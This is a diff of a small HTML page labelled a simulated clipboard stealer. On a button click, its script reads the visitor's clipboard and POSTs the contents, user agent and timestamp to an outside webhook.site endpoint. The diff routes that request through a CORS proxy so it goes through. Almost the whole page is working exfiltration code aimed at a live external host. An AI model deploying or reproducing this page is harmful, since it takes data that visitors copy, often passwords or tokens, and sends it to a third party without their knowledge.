@@ -1,38 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Clipboard Exfil Test</title>
+  <meta charset="UTF-8" />
+  <title>Clipboard Stealer Demo (CORS Proxy)</title>
 </head>
 <body>
-  <h1>🚨 Clipboard Exfil Test</h1>
-  <button onclick="exfiltrate()">Steal Clipboard & POST</button>
+  <h1>🚨 Simulated Clipboard Stealer</h1>
+  <button onclick="stealClipboard()">Steal Clipboard & POST</button>
   <pre id="output"></pre>
 
   <script>
-    async function exfiltrate() {
+    async function stealClipboard() {
       const output = document.getElementById('output');
+
       try {
         const data = await navigator.clipboard.readText();
-        output.textContent = `📋 Clipboard:\n${data}`;
+        output.textContent = "📋 Clipboard:\n" + data;
 
-        const body = {
+        const payload = {
           stolenData: data,
           userAgent: navigator.userAgent,
           timestamp: new Date().toISOString()
         };
 
-        const res = await fetch("https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1", {
+        const webhookURL = "https://corsproxy.io/?https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace with your full ID
+
+        const response = await fetch(webhookURL, {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify(body)
+          body: JSON.stringify(payload)
         });
 
-        output.textContent += `\n\n✅ Sent to Webhook.site.\nStatus: ${res.status}`;
+        const resultText = await response.text();
+        output.textContent += `\n\n✅ Sent to webhook.\nStatus: ${response.status}\nResponse: ${resultText}`;
       } catch (err) {
         output.textContent += `\n\n❌ Error: ${err}`;
+        console.error("Fetch Error:", err);
       }
     }
   </script>
